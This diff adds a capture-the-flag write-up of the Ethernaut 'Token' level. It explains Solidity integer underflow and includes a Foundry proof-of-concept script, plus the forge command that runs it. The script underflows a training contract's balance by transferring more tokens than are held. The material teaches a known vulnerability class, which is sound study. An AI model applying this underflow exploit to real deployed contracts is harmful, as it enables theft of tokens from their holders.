@@ -1,0 +1,101 @@
+"This level requires us to fund our account with additional tokens. We are funded with 20 tokens initially to get started. 
+To understand this level, we must know the concept of overflows and underflows. Let's dive in. 
+All the variables have a maximum capacity that they can store. Let's take the example of uint8. The largest number which it can store is 2^8-1 which comes out to be 255. 
+The number of bits determines directly the range for their values. So an 8-bit variable type can store at most 11111111 in binary. 
+uint8
+2^8-1
+255
+Integer Overflow is a scenario where the unsigned variable types reach their maximum capacity. When it can't hold anymore, it just resets back to its initial minimum point which was 0. 
+For example, if you take an unsigned 8 bit variable, uint8, with a value of 255 and add 1 to it. What do you think will be the answer? 0 or 256? Let me show you a practical deployment. 
+uint8
+Let's execute the following test script and see what we get in the console. 
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Test.sol"";
+
+contract Testme is Test {
+
+    function test() external {
+        vm.startBroadcast();
+
+        uint8 a = 255;
+        uint8 b = 1;
+        console.log(""The value of a + b is : "", a + b);
+
+        vm.stopBroadcast();
+    }
+}
+
+forge test --match-path test/test.sol -vvvv --rpc-url $RPC_URL
+
+
+This proves that the variable was overflowed and its value reached 0 after 255. 
+The opposite goes for underflows. Taking uint8 as an example, if you subtract 2 from 1, the result will be 255. 
+uint8
+2
+1
+To complete this level, we have to underflow the token balance. Let's go through the contract. 
+The function of importance is transfer(). 
+transfer()
+function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+}
+
+This function is responsible for the transfer of tokens and accepts an address to which to send the tokens and a value specifying how many tokens to send. 
+We can check our initial token balance either using the console - await contract.balanceOf(player) or by using foundry scripts. 
+await contract.balanceOf(player)
+>=0
+_to
+The vulnerability lies in the second line which is deducting our balance. 
+In older versions of Solidity, there was no validation for overflows and underflows therefore developers had to implement their own checks. A SafeMath library was also introduced for this purpose. 
+But since Solidity 0.8.0+, there's no need to use the SafeMath since it natively checks the variables for overflows and underflows and reverts if detected. 
+0.8.0+
+SafeMath
+The contract's Solidity version is ^0.6.0 which means that it is prone to overflows and underflows. 
+^0.6.0
+Since the objective of the level is for us to acquire some tokens, we'll have to exploit the following statements
+require(balances[msg.sender] - _value >= 0);
+balances[msg.sender] -= _value;
+
+What if we deposit a token value of 21? It'll probably underflow. 
+21
+require
+20 - 21
+balances[msg.sender] -= _value;
+balances[msg.sender] = 20 - 21
+Here's how our PoC script looks:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel05.sol"";
+
+contract POC is Script {
+    Token level5 = Token(0x64db54633180E5C63Ca63393324a8E0843dFa485);
+
+    function run() external {
+        vm.startBroadcast();
+
+        console.log(""Current balance is :"", level5.balanceOf(msg.sender));
+        level5.transfer(0xD6aE8250b8348C94847280928c79fb3b63cA453e, 21);
+        console.log(""New balance is :"", level5.balanceOf(msg.sender));
+
+        vm.stopBroadcast();
+    }
+}
+
+We can execute this with forge:
+forge script ./script/level05.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL
+
+We are just calling the transfer() function with a random address and 21 tokens to send to that address. The value will overflow as discussed above and will result in our account having a lot more tokens. The logged output can be seen below:
+transfer()
+
+Now we can just submit the instance to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+0.8.0
+>= 0.8.0
+unchecked"
